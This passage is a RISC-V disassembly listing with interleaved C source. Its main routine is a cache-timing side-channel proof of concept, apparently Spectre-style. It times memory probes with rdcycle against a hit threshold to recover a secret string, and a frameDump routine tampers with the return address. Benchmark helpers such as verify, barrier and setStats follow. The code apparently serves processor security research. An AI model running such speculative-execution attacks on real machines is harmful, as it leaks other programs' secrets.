    80001426:	0007c703          	lbu	a4,0(a5) # ffffffffffff0000 <_end+0xffffffff7ffd4b40>
    8000142a:	fe744783          	lbu	a5,-25(s0)
    8000142e:	8ff9                	and	a5,a5,a4
    80001430:	fef403a3          	sb	a5,-25(s0)
                diff = (rdcycle() - start);
    80001434:	c00027f3          	rdcycle	a5
    80001438:	f8f43423          	sd	a5,-120(s0)
    8000143c:	f8843703          	ld	a4,-120(s0)
    80001440:	f9043783          	ld	a5,-112(s0)
    80001444:	40f707b3          	sub	a5,a4,a5
    80001448:	f8f43023          	sd	a5,-128(s0)
                //printf("%d,%d\n",i, diff);
                if ( diff < CACHE_HIT_THRESHOLD ){
    8000144c:	f8043703          	ld	a4,-128(s0)
    80001450:	03100793          	li	a5,49
    80001454:	02e7e663          	bltu	a5,a4,80001480 <main+0x230>
                    results[i] += 1;
    80001458:	0001a717          	auipc	a4,0x1a
    8000145c:	82870713          	addi	a4,a4,-2008 # 8001ac80 <results.2502>
    80001460:	fb043783          	ld	a5,-80(s0)
    80001464:	078e                	slli	a5,a5,0x3
    80001466:	97ba                	add	a5,a5,a4
    80001468:	639c                	ld	a5,0(a5)
    8000146a:	00178713          	addi	a4,a5,1
    8000146e:	0001a697          	auipc	a3,0x1a
    80001472:	81268693          	addi	a3,a3,-2030 # 8001ac80 <results.2502>
    80001476:	fb043783          	ld	a5,-80(s0)
    8000147a:	078e                	slli	a5,a5,0x3
    8000147c:	97b6                	add	a5,a5,a3
    8000147e:	e398                	sd	a4,0(a5)
            for (uint64_t i = 0; i < 256; ++i){
    80001480:	fb043783          	ld	a5,-80(s0)
    80001484:	0785                	addi	a5,a5,1
    80001486:	faf43823          	sd	a5,-80(s0)
    8000148a:	fb043703          	ld	a4,-80(s0)
    8000148e:	0ff00793          	li	a5,255
    80001492:	f6e7fae3          	bleu	a4,a5,80001406 <main+0x1b6>
        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){
    80001496:	fc843783          	ld	a5,-56(s0)
    8000149a:	0785                	addi	a5,a5,1
    8000149c:	fcf43423          	sd	a5,-56(s0)
    800014a0:	fc843703          	ld	a4,-56(s0)
    800014a4:	47a5                	li	a5,9
    800014a6:	e4e7f5e3          	bleu	a4,a5,800012f0 <main+0xa0>
        }
        
        // get highest and second highest result hit values
        uint8_t output[2];
        uint64_t hitArray[2];
        topTwoIdx(results, 256, output, hitArray);
    800014aa:	f5040713          	addi	a4,s0,-176
    800014ae:	f6040793          	addi	a5,s0,-160
    800014b2:	86ba                	mv	a3,a4
    800014b4:	863e                	mv	a2,a5
    800014b6:	10000593          	li	a1,256
    800014ba:	00019517          	auipc	a0,0x19
    800014be:	7c650513          	addi	a0,a0,1990 # 8001ac80 <results.2502>
    800014c2:	c55ff0ef          	jal	ra,80001116 <topTwoIdx>

        if(output[0] == (int)secretString[len] || output[1] == (int)secretString[len]) 
    800014c6:	f6044683          	lbu	a3,-160(s0)
    800014ca:	00001797          	auipc	a5,0x1
    800014ce:	71e78793          	addi	a5,a5,1822 # 80002be8 <secretString>
    800014d2:	6398                	ld	a4,0(a5)
    800014d4:	fd843783          	ld	a5,-40(s0)
    800014d8:	97ba                	add	a5,a5,a4
    800014da:	0007c783          	lbu	a5,0(a5)
    800014de:	8736                	mv	a4,a3
    800014e0:	02f70163          	beq	a4,a5,80001502 <main+0x2b2>
    800014e4:	f6144683          	lbu	a3,-159(s0)
    800014e8:	00001797          	auipc	a5,0x1
    800014ec:	70078793          	addi	a5,a5,1792 # 80002be8 <secretString>
    800014f0:	6398                	ld	a4,0(a5)
    800014f2:	fd843783          	ld	a5,-40(s0)
    800014f6:	97ba                	add	a5,a5,a4
    800014f8:	0007c783          	lbu	a5,0(a5)
    800014fc:	8736                	mv	a4,a3
    800014fe:	06f71263          	bne	a4,a5,80001562 <main+0x312>
        printf("\033[0;32;32mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    80001502:	fe843703          	ld	a4,-24(s0)
    80001506:	00001797          	auipc	a5,0x1
    8000150a:	63a78793          	addi	a5,a5,1594 # 80002b40 <array1>
    8000150e:	00f705b3          	add	a1,a4,a5
        (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], 
    80001512:	00001797          	auipc	a5,0x1
    80001516:	6d678793          	addi	a5,a5,1750 # 80002be8 <secretString>
    8000151a:	6398                	ld	a4,0(a5)
    8000151c:	fd843783          	ld	a5,-40(s0)
    80001520:	97ba                	add	a5,a5,a4
    80001522:	0007c783          	lbu	a5,0(a5)
        printf("\033[0;32;32mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    80001526:	0007861b          	sext.w	a2,a5
    8000152a:	f5043683          	ld	a3,-176(s0)
        (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], 
    8000152e:	f6044783          	lbu	a5,-160(s0)
        printf("\033[0;32;32mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    80001532:	0007871b          	sext.w	a4,a5
        (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], 
    80001536:	f6044783          	lbu	a5,-160(s0)
        printf("\033[0;32;32mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    8000153a:	0007851b          	sext.w	a0,a5
    8000153e:	f5843803          	ld	a6,-168(s0)
                                                           hitArray[1], output[1], output[1]); 
    80001542:	f6144783          	lbu	a5,-159(s0)
        printf("\033[0;32;32mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    80001546:	0007889b          	sext.w	a7,a5
                                                           hitArray[1], output[1], output[1]); 
    8000154a:	f6144783          	lbu	a5,-159(s0)
        printf("\033[0;32;32mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    8000154e:	2781                	sext.w	a5,a5
    80001550:	e03e                	sd	a5,0(sp)
    80001552:	87aa                	mv	a5,a0
    80001554:	00001517          	auipc	a0,0x1
    80001558:	37c50513          	addi	a0,a0,892 # 800028d0 <atol+0x180>
    8000155c:	5cd000ef          	jal	ra,80002328 <printf>
    80001560:	a085                	j	800015c0 <main+0x370>
        else 
        printf("\033[0;32;31mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    80001562:	fe843703          	ld	a4,-24(s0)
    80001566:	00001797          	auipc	a5,0x1
    8000156a:	5da78793          	addi	a5,a5,1498 # 80002b40 <array1>
    8000156e:	00f705b3          	add	a1,a4,a5
        (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], 
    80001572:	00001797          	auipc	a5,0x1
    80001576:	67678793          	addi	a5,a5,1654 # 80002be8 <secretString>
    8000157a:	6398                	ld	a4,0(a5)
    8000157c:	fd843783          	ld	a5,-40(s0)
    80001580:	97ba                	add	a5,a5,a4
    80001582:	0007c783          	lbu	a5,0(a5)
        printf("\033[0;32;31mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    80001586:	0007861b          	sext.w	a2,a5
    8000158a:	f5043683          	ld	a3,-176(s0)
        (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], 
    8000158e:	f6044783          	lbu	a5,-160(s0)
        printf("\033[0;32;31mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    80001592:	0007871b          	sext.w	a4,a5
        (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], 
    80001596:	f6044783          	lbu	a5,-160(s0)
        printf("\033[0;32;31mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    8000159a:	0007851b          	sext.w	a0,a5
    8000159e:	f5843803          	ld	a6,-168(s0)
                                                           hitArray[1], output[1], output[1]);  
    800015a2:	f6144783          	lbu	a5,-159(s0)
        printf("\033[0;32;31mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    800015a6:	0007889b          	sext.w	a7,a5
                                                           hitArray[1], output[1], output[1]);  
    800015aa:	f6144783          	lbu	a5,-159(s0)
        printf("\033[0;32;31mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    800015ae:	2781                	sext.w	a5,a5
    800015b0:	e03e                	sd	a5,0(sp)
    800015b2:	87aa                	mv	a5,a0
    800015b4:	00001517          	auipc	a0,0x1
    800015b8:	37c50513          	addi	a0,a0,892 # 80002930 <atol+0x1e0>
    800015bc:	56d000ef          	jal	ra,80002328 <printf>

        // read in the next secret 
        ++attackIdx;
    800015c0:	fe843783          	ld	a5,-24(s0)
    800015c4:	0785                	addi	a5,a5,1
    800015c6:	fef43423          	sd	a5,-24(s0)
    for(uint64_t len = 0; len < SECRET_SZ; ++len){
    800015ca:	fd843783          	ld	a5,-40(s0)
    800015ce:	0785                	addi	a5,a5,1
    800015d0:	fcf43c23          	sd	a5,-40(s0)
    800015d4:	fd843703          	ld	a4,-40(s0)
    800015d8:	47e5                	li	a5,25
    800015da:	cee7f0e3          	bleu	a4,a5,800012ba <main+0x6a>
    }

    return 0;
    800015de:	4781                	li	a5,0
}
    800015e0:	853e                	mv	a0,a5
    800015e2:	70ea                	ld	ra,184(sp)
    800015e4:	744a                	ld	s0,176(sp)
    800015e6:	6129                	addi	sp,sp,192
    800015e8:	8082                	ret

00000000800015ea <frameDump>:
    800015ea:	70e2                	ld	ra,56(sp)
    800015ec:	6121                	addi	sp,sp,64
    800015ee:	10f9                	addi	ra,ra,-2
    800015f0:	00200313          	li	t1,2
    800015f4:	00431393          	slli	t2,t1,0x4
    800015f8:	d0337753          	fcvt.s.lu	fa4,t1
    800015fc:	d033f7d3          	fcvt.s.lu	fa5,t2
    80001600:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    80001604:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    80001608:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    8000160c:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    80001610:	c03793d3          	fcvt.lu.s	t2,fa5,rtz
    80001614:	909e                	add	ra,ra,t2
    80001616:	8082                	ret

0000000080001618 <printArray>:
#include <stdint.h>

#define static_assert(cond) switch(0) { case 0: case !!(long)(cond): ; }

static void printArray(const char name[], int n, const int arr[])
{
    80001618:	7179                	addi	sp,sp,-48
    8000161a:	f422                	sd	s0,40(sp)
    8000161c:	1800                	addi	s0,sp,48
    8000161e:	fea43423          	sd	a0,-24(s0)
    80001622:	87ae                	mv	a5,a1
    80001624:	fcc43c23          	sd	a2,-40(s0)
    80001628:	fef42223          	sw	a5,-28(s0)
  printf( " %10s :", name );
  for ( i = 0; i < n; i++ )
    printf( " %3d ", arr[i] );
  printf( "\n" );
#endif
}
    8000162c:	0001                	nop
    8000162e:	7422                	ld	s0,40(sp)
    80001630:	6145                	addi	sp,sp,48
    80001632:	8082                	ret

0000000080001634 <printDoubleArray>:

static void printDoubleArray(const char name[], int n, const double arr[])
{
    80001634:	7179                	addi	sp,sp,-48
    80001636:	f422                	sd	s0,40(sp)
    80001638:	1800                	addi	s0,sp,48
    8000163a:	fea43423          	sd	a0,-24(s0)
    8000163e:	87ae                	mv	a5,a1
    80001640:	fcc43c23          	sd	a2,-40(s0)
    80001644:	fef42223          	sw	a5,-28(s0)
  printf( " %10s :", name );
  for ( i = 0; i < n; i++ )
    printf( " %g ", arr[i] );
  printf( "\n" );
#endif
}
    80001648:	0001                	nop
    8000164a:	7422                	ld	s0,40(sp)
    8000164c:	6145                	addi	sp,sp,48
    8000164e:	8082                	ret

0000000080001650 <verify>:

static int verify(int n, const volatile int* test, const int* verify)
{
    80001650:	715d                	addi	sp,sp,-80
    80001652:	e4a2                	sd	s0,72(sp)
    80001654:	0880                	addi	s0,sp,80
    80001656:	87aa                	mv	a5,a0
    80001658:	fcb43023          	sd	a1,-64(s0)
    8000165c:	fac43c23          	sd	a2,-72(s0)
    80001660:	fcf42623          	sw	a5,-52(s0)
  int i;
  // Unrolled for faster verification
  for (i = 0; i < n/2*2; i+=2)
    80001664:	fe042623          	sw	zero,-20(s0)
    80001668:	a071                	j	800016f4 <verify+0xa4>
  {
    int t0 = test[i], t1 = test[i+1];
    8000166a:	fec42783          	lw	a5,-20(s0)
    8000166e:	078a                	slli	a5,a5,0x2
    80001670:	fc043703          	ld	a4,-64(s0)
    80001674:	97ba                	add	a5,a5,a4
    80001676:	439c                	lw	a5,0(a5)
    80001678:	fef42423          	sw	a5,-24(s0)
    8000167c:	fec42783          	lw	a5,-20(s0)
    80001680:	0785                	addi	a5,a5,1
    80001682:	078a                	slli	a5,a5,0x2
    80001684:	fc043703          	ld	a4,-64(s0)
    80001688:	97ba                	add	a5,a5,a4
    8000168a:	439c                	lw	a5,0(a5)
    8000168c:	fef42223          	sw	a5,-28(s0)
    int v0 = verify[i], v1 = verify[i+1];
    80001690:	fec42783          	lw	a5,-20(s0)
    80001694:	078a                	slli	a5,a5,0x2
    80001696:	fb843703          	ld	a4,-72(s0)
    8000169a:	97ba                	add	a5,a5,a4
    8000169c:	439c                	lw	a5,0(a5)
    8000169e:	fef42023          	sw	a5,-32(s0)
    800016a2:	fec42783          	lw	a5,-20(s0)
    800016a6:	0785                	addi	a5,a5,1
    800016a8:	078a                	slli	a5,a5,0x2
    800016aa:	fb843703          	ld	a4,-72(s0)
    800016ae:	97ba                	add	a5,a5,a4
    800016b0:	439c                	lw	a5,0(a5)
    800016b2:	fcf42e23          	sw	a5,-36(s0)
    if (t0 != v0) return i+1;
    800016b6:	fe842703          	lw	a4,-24(s0)
    800016ba:	fe042783          	lw	a5,-32(s0)
    800016be:	2701                	sext.w	a4,a4
    800016c0:	2781                	sext.w	a5,a5
    800016c2:	00f70763          	beq	a4,a5,800016d0 <verify+0x80>
    800016c6:	fec42783          	lw	a5,-20(s0)
    800016ca:	2785                	addiw	a5,a5,1
    800016cc:	2781                	sext.w	a5,a5
    800016ce:	a051                	j	80001752 <verify+0x102>
    if (t1 != v1) return i+2;
    800016d0:	fe442703          	lw	a4,-28(s0)
    800016d4:	fdc42783          	lw	a5,-36(s0)
    800016d8:	2701                	sext.w	a4,a4
    800016da:	2781                	sext.w	a5,a5
    800016dc:	00f70763          	beq	a4,a5,800016ea <verify+0x9a>
    800016e0:	fec42783          	lw	a5,-20(s0)
    800016e4:	2789                	addiw	a5,a5,2
    800016e6:	2781                	sext.w	a5,a5
    800016e8:	a0ad                	j	80001752 <verify+0x102>
  for (i = 0; i < n/2*2; i+=2)
    800016ea:	fec42783          	lw	a5,-20(s0)
    800016ee:	2789                	addiw	a5,a5,2
    800016f0:	fef42623          	sw	a5,-20(s0)
    800016f4:	fcc42783          	lw	a5,-52(s0)
    800016f8:	01f7d71b          	srliw	a4,a5,0x1f
    800016fc:	9fb9                	addw	a5,a5,a4
    800016fe:	4017d79b          	sraiw	a5,a5,0x1
    80001702:	2781                	sext.w	a5,a5
    80001704:	0017979b          	slliw	a5,a5,0x1
    80001708:	0007871b          	sext.w	a4,a5
    8000170c:	fec42783          	lw	a5,-20(s0)
    80001710:	2781                	sext.w	a5,a5
    80001712:	f4e7cce3          	blt	a5,a4,8000166a <verify+0x1a>
  }
  if (n % 2 != 0 && test[n-1] != verify[n-1])
    80001716:	fcc42783          	lw	a5,-52(s0)
    8000171a:	8b85                	andi	a5,a5,1
    8000171c:	2781                	sext.w	a5,a5
    8000171e:	cb8d                	beqz	a5,80001750 <verify+0x100>
    80001720:	fcc42783          	lw	a5,-52(s0)
    80001724:	078a                	slli	a5,a5,0x2
    80001726:	17f1                	addi	a5,a5,-4
    80001728:	fc043703          	ld	a4,-64(s0)
    8000172c:	97ba                	add	a5,a5,a4
    8000172e:	439c                	lw	a5,0(a5)
    80001730:	0007869b          	sext.w	a3,a5
    80001734:	fcc42783          	lw	a5,-52(s0)
    80001738:	078a                	slli	a5,a5,0x2
    8000173a:	17f1                	addi	a5,a5,-4
    8000173c:	fb843703          	ld	a4,-72(s0)
    80001740:	97ba                	add	a5,a5,a4
    80001742:	439c                	lw	a5,0(a5)
    80001744:	8736                	mv	a4,a3
    80001746:	00f70563          	beq	a4,a5,80001750 <verify+0x100>
    return n;
    8000174a:	fcc42783          	lw	a5,-52(s0)
    8000174e:	a011                	j	80001752 <verify+0x102>
  return 0;
    80001750:	4781                	li	a5,0
}
    80001752:	853e                	mv	a0,a5
    80001754:	6426                	ld	s0,72(sp)
    80001756:	6161                	addi	sp,sp,80
    80001758:	8082                	ret

000000008000175a <verifyDouble>:

static int verifyDouble(int n, const volatile double* test, const double* verify)
{
    8000175a:	711d                	addi	sp,sp,-96
    8000175c:	eca2                	sd	s0,88(sp)
    8000175e:	1080                	addi	s0,sp,96
    80001760:	87aa                	mv	a5,a0
    80001762:	fab43823          	sd	a1,-80(s0)
    80001766:	fac43423          	sd	a2,-88(s0)
    8000176a:	faf42e23          	sw	a5,-68(s0)
  int i;
  // Unrolled for faster verification
  for (i = 0; i < n/2*2; i+=2)
    8000176e:	fe042623          	sw	zero,-20(s0)
    80001772:	a065                	j	8000181a <verifyDouble+0xc0>
  {
    double t0 = test[i], t1 = test[i+1];
    80001774:	fec42783          	lw	a5,-20(s0)
    80001778:	078e                	slli	a5,a5,0x3
    8000177a:	fb043703          	ld	a4,-80(s0)
    8000177e:	97ba                	add	a5,a5,a4
    80001780:	239c                	fld	fa5,0(a5)
    80001782:	fef43027          	fsd	fa5,-32(s0)
    80001786:	fec42783          	lw	a5,-20(s0)
    8000178a:	0785                	addi	a5,a5,1
    8000178c:	078e                	slli	a5,a5,0x3
    8000178e:	fb043703          	ld	a4,-80(s0)
    80001792:	97ba                	add	a5,a5,a4
    80001794:	239c                	fld	fa5,0(a5)
    80001796:	fcf43c27          	fsd	fa5,-40(s0)
    double v0 = verify[i], v1 = verify[i+1];
    8000179a:	fec42783          	lw	a5,-20(s0)
    8000179e:	078e                	slli	a5,a5,0x3
    800017a0:	fa843703          	ld	a4,-88(s0)
    800017a4:	97ba                	add	a5,a5,a4
    800017a6:	239c                	fld	fa5,0(a5)
    800017a8:	fcf43827          	fsd	fa5,-48(s0)
    800017ac:	fec42783          	lw	a5,-20(s0)
    800017b0:	0785                	addi	a5,a5,1
    800017b2:	078e                	slli	a5,a5,0x3
    800017b4:	fa843703          	ld	a4,-88(s0)
    800017b8:	97ba                	add	a5,a5,a4
    800017ba:	239c                	fld	fa5,0(a5)
    800017bc:	fcf43427          	fsd	fa5,-56(s0)
    int eq1 = t0 == v0, eq2 = t1 == v1;
    800017c0:	fe043707          	fld	fa4,-32(s0)
    800017c4:	fd043787          	fld	fa5,-48(s0)
    800017c8:	a2f727d3          	feq.d	a5,fa4,fa5
    800017cc:	00f037b3          	snez	a5,a5
    800017d0:	0ff7f793          	andi	a5,a5,255
    800017d4:	fcf42223          	sw	a5,-60(s0)
    800017d8:	fd843707          	fld	fa4,-40(s0)
    800017dc:	fc843787          	fld	fa5,-56(s0)
    800017e0:	a2f727d3          	feq.d	a5,fa4,fa5
    800017e4:	00f037b3          	snez	a5,a5
    800017e8:	0ff7f793          	andi	a5,a5,255
    800017ec:	fcf42023          	sw	a5,-64(s0)
    if (!(eq1 & eq2)) return i+1+eq1;
    800017f0:	fc442703          	lw	a4,-60(s0)
    800017f4:	fc042783          	lw	a5,-64(s0)
    800017f8:	8ff9                	and	a5,a5,a4
    800017fa:	2781                	sext.w	a5,a5
    800017fc:	eb91                	bnez	a5,80001810 <verifyDouble+0xb6>
    800017fe:	fec42783          	lw	a5,-20(s0)
    80001802:	2785                	addiw	a5,a5,1
    80001804:	2781                	sext.w	a5,a5
    80001806:	fc442703          	lw	a4,-60(s0)
    8000180a:	9fb9                	addw	a5,a5,a4
    8000180c:	2781                	sext.w	a5,a5
    8000180e:	a09d                	j	80001874 <verifyDouble+0x11a>
  for (i = 0; i < n/2*2; i+=2)
    80001810:	fec42783          	lw	a5,-20(s0)
    80001814:	2789                	addiw	a5,a5,2
    80001816:	fef42623          	sw	a5,-20(s0)
    8000181a:	fbc42783          	lw	a5,-68(s0)
    8000181e:	01f7d71b          	srliw	a4,a5,0x1f
    80001822:	9fb9                	addw	a5,a5,a4
    80001824:	4017d79b          	sraiw	a5,a5,0x1
    80001828:	2781                	sext.w	a5,a5
    8000182a:	0017979b          	slliw	a5,a5,0x1
    8000182e:	0007871b          	sext.w	a4,a5
    80001832:	fec42783          	lw	a5,-20(s0)
    80001836:	2781                	sext.w	a5,a5
    80001838:	f2e7cee3          	blt	a5,a4,80001774 <verifyDouble+0x1a>
  }
  if (n % 2 != 0 && test[n-1] != verify[n-1])
    8000183c:	fbc42783          	lw	a5,-68(s0)
    80001840:	8b85                	andi	a5,a5,1
    80001842:	2781                	sext.w	a5,a5
    80001844:	c79d                	beqz	a5,80001872 <verifyDouble+0x118>
    80001846:	fbc42783          	lw	a5,-68(s0)
    8000184a:	078e                	slli	a5,a5,0x3
    8000184c:	17e1                	addi	a5,a5,-8
    8000184e:	fb043703          	ld	a4,-80(s0)
    80001852:	97ba                	add	a5,a5,a4
    80001854:	2398                	fld	fa4,0(a5)
    80001856:	fbc42783          	lw	a5,-68(s0)
    8000185a:	078e                	slli	a5,a5,0x3
    8000185c:	17e1                	addi	a5,a5,-8
    8000185e:	fa843703          	ld	a4,-88(s0)
    80001862:	97ba                	add	a5,a5,a4
    80001864:	239c                	fld	fa5,0(a5)
    80001866:	a2f727d3          	feq.d	a5,fa4,fa5
    8000186a:	e781                	bnez	a5,80001872 <verifyDouble+0x118>
    return n;
    8000186c:	fbc42783          	lw	a5,-68(s0)
    80001870:	a011                	j	80001874 <verifyDouble+0x11a>
  return 0;
    80001872:	4781                	li	a5,0
}
    80001874:	853e                	mv	a0,a5
    80001876:	6466                	ld	s0,88(sp)
    80001878:	6125                	addi	sp,sp,96
    8000187a:	8082                	ret

000000008000187c <barrier>:

static void __attribute__((noinline)) barrier(int ncores)
{
    8000187c:	1101                	addi	sp,sp,-32
    8000187e:	ec22                	sd	s0,24(sp)
    80001880:	1000                	addi	s0,sp,32
    80001882:	87aa                	mv	a5,a0
    80001884:	fef42623          	sw	a5,-20(s0)
  static volatile int sense;
  static volatile int count;
  static __thread int threadsense;

  __sync_synchronize();
    80001888:	0ff0000f          	fence

  threadsense = !threadsense;
    8000188c:	00022783          	lw	a5,0(tp) # 0 <_tdata_begin>
    80001890:	0017b793          	seqz	a5,a5
    80001894:	0ff7f793          	andi	a5,a5,255
    80001898:	0007871b          	sext.w	a4,a5
    8000189c:	00e22023          	sw	a4,0(tp) # 0 <_tdata_begin>
  if (__sync_fetch_and_add(&count, 1) == ncores-1)
    800018a0:	0001a797          	auipc	a5,0x1a
    800018a4:	c0078793          	addi	a5,a5,-1024 # 8001b4a0 <count.2896>
    800018a8:	4705                	li	a4,1
    800018aa:	0f50000f          	fence	iorw,ow
    800018ae:	04e7a6af          	amoadd.w.aq	a3,a4,(a5)
    800018b2:	0006879b          	sext.w	a5,a3
    800018b6:	0007871b          	sext.w	a4,a5
    800018ba:	fec42783          	lw	a5,-20(s0)
    800018be:	37fd                	addiw	a5,a5,-1
    800018c0:	2781                	sext.w	a5,a5
    800018c2:	02f71063          	bne	a4,a5,800018e2 <barrier+0x66>
  {
    count = 0;
    800018c6:	0001a797          	auipc	a5,0x1a
    800018ca:	bda78793          	addi	a5,a5,-1062 # 8001b4a0 <count.2896>
    800018ce:	0007a023          	sw	zero,0(a5)
    sense = threadsense;
    800018d2:	00022703          	lw	a4,0(tp) # 0 <_tdata_begin>
    800018d6:	0001a797          	auipc	a5,0x1a
    800018da:	bce78793          	addi	a5,a5,-1074 # 8001b4a4 <sense.2895>
    800018de:	c398                	sw	a4,0(a5)
    800018e0:	a829                	j	800018fa <barrier+0x7e>
  }
  else while(sense != threadsense)
    800018e2:	0001                	nop
    800018e4:	0001a797          	auipc	a5,0x1a
    800018e8:	bc078793          	addi	a5,a5,-1088 # 8001b4a4 <sense.2895>
    800018ec:	439c                	lw	a5,0(a5)
    800018ee:	0007871b          	sext.w	a4,a5
    800018f2:	00022783          	lw	a5,0(tp) # 0 <_tdata_begin>
    800018f6:	fef717e3          	bne	a4,a5,800018e4 <barrier+0x68>
    ;

  __sync_synchronize();
    800018fa:	0ff0000f          	fence
}
    800018fe:	0001                	nop
    80001900:	6462                	ld	s0,24(sp)
    80001902:	6105                	addi	sp,sp,32
    80001904:	8082                	ret

0000000080001906 <lfsr>:

static uint64_t lfsr(uint64_t x)
{
    80001906:	7179                	addi	sp,sp,-48
    80001908:	f422                	sd	s0,40(sp)
    8000190a:	1800                	addi	s0,sp,48
    8000190c:	fca43c23          	sd	a0,-40(s0)
  uint64_t bit = (x ^ (x >> 1)) & 1;
    80001910:	fd843783          	ld	a5,-40(s0)
    80001914:	0017d713          	srli	a4,a5,0x1
    80001918:	fd843783          	ld	a5,-40(s0)
    8000191c:	8fb9                	xor	a5,a5,a4
    8000191e:	8b85                	andi	a5,a5,1
    80001920:	fef43423          	sd	a5,-24(s0)
  return (x >> 1) | (bit << 62);
    80001924:	fd843783          	ld	a5,-40(s0)
    80001928:	0017d713          	srli	a4,a5,0x1
    8000192c:	fe843783          	ld	a5,-24(s0)
    80001930:	17fa                	slli	a5,a5,0x3e
    80001932:	8fd9                	or	a5,a5,a4
}
    80001934:	853e                	mv	a0,a5
    80001936:	7422                	ld	s0,40(sp)
    80001938:	6145                	addi	sp,sp,48
    8000193a:	8082                	ret

000000008000193c <syscall>:

extern volatile uint64_t tohost;
extern volatile uint64_t fromhost;

static uintptr_t syscall(uintptr_t which, uint64_t arg0, uint64_t arg1, uint64_t arg2)
{
    8000193c:	7171                	addi	sp,sp,-176
    8000193e:	f522                	sd	s0,168(sp)
    80001940:	1900                	addi	s0,sp,176
    80001942:	f6a43c23          	sd	a0,-136(s0)
    80001946:	f6b43823          	sd	a1,-144(s0)
    8000194a:	f6c43423          	sd	a2,-152(s0)
    8000194e:	f6d43023          	sd	a3,-160(s0)
    80001952:	ff040793          	addi	a5,s0,-16
    80001956:	f4f43c23          	sd	a5,-168(s0)
    8000195a:	f5843783          	ld	a5,-168(s0)
    8000195e:	f9078793          	addi	a5,a5,-112
    80001962:	03f78793          	addi	a5,a5,63
    80001966:	8399                	srli	a5,a5,0x6
    80001968:	079a                	slli	a5,a5,0x6
  volatile uint64_t magic_mem[8] __attribute__((aligned(64)));
  magic_mem[0] = which;
    8000196a:	f7843703          	ld	a4,-136(s0)
    8000196e:	e398                	sd	a4,0(a5)
  magic_mem[1] = arg0;
    80001970:	f7043703          	ld	a4,-144(s0)
    80001974:	e798                	sd	a4,8(a5)
  magic_mem[2] = arg1;
    80001976:	f6843703          	ld	a4,-152(s0)
    8000197a:	eb98                	sd	a4,16(a5)
  magic_mem[3] = arg2;
    8000197c:	f6043703          	ld	a4,-160(s0)
    80001980:	ef98                	sd	a4,24(a5)
  __sync_synchronize();
    80001982:	0ff0000f          	fence

  tohost = (uintptr_t)magic_mem;
    80001986:	86be                	mv	a3,a5
    80001988:	fffff717          	auipc	a4,0xfffff
    8000198c:	67870713          	addi	a4,a4,1656 # 80001000 <tohost>
    80001990:	e314                	sd	a3,0(a4)
  while (fromhost == 0)
    80001992:	0001                	nop
    80001994:	fffff717          	auipc	a4,0xfffff
    80001998:	6ac70713          	addi	a4,a4,1708 # 80001040 <fromhost>
    8000199c:	6318                	ld	a4,0(a4)
    8000199e:	db7d                	beqz	a4,80001994 <syscall+0x58>
    ;
  fromhost = 0;
    800019a0:	fffff717          	auipc	a4,0xfffff
    800019a4:	6a070713          	addi	a4,a4,1696 # 80001040 <fromhost>
    800019a8:	00073023          	sd	zero,0(a4)

  __sync_synchronize();
    800019ac:	0ff0000f          	fence
  return magic_mem[0];
    800019b0:	639c                	ld	a5,0(a5)
}
    800019b2:	853e                	mv	a0,a5
    800019b4:	742a                	ld	s0,168(sp)
    800019b6:	614d                	addi	sp,sp,176
    800019b8:	8082                	ret

00000000800019ba <setStats>:
#define NUM_COUNTERS 2
static uintptr_t counters[NUM_COUNTERS];
static char* counter_names[NUM_COUNTERS];

void setStats(int enable)
{
    800019ba:	715d                	addi	sp,sp,-80
    800019bc:	e4a2                	sd	s0,72(sp)
    800019be:	0880                	addi	s0,sp,80
    800019c0:	87aa                	mv	a5,a0
    800019c2:	faf42e23          	sw	a5,-68(s0)
  int i = 0;
    800019c6:	fc042e23          	sw	zero,-36(s0)
    uintptr_t csr = read_csr(name); \
    if (!enable) { csr -= counters[i]; counter_names[i] = #name; } \
    counters[i++] = csr; \
  } while (0)

  READ_CTR(mcycle);
    800019ca:	fdc42783          	lw	a5,-36(s0)
    800019ce:	0007871b          	sext.w	a4,a5
    800019d2:	4785                	li	a5,1
    800019d4:	fee7cbe3          	blt	a5,a4,800019ca <setStats+0x10>
    800019d8:	b00027f3          	csrr	a5,mcycle
    800019dc:	fcf43823          	sd	a5,-48(s0)
    800019e0:	fd043783          	ld	a5,-48(s0)
    800019e4:	fef43423          	sd	a5,-24(s0)
    800019e8:	fbc42783          	lw	a5,-68(s0)
    800019ec:	2781                	sext.w	a5,a5
